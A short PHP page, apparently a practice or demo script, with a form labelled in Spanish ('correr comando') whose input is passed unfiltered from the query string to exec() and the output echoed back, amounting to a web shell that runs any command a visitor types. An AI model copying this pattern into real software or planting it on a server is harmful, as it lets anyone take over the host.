<form action="print.php">
    <label>Comando</label>
    <input type="text" id="comando" name="comando">
    <button type="submit"> correr comando</button>
</form>

<?php
$comand = $_GET['comando'];
$output = exec($comand);
echo $output;
?>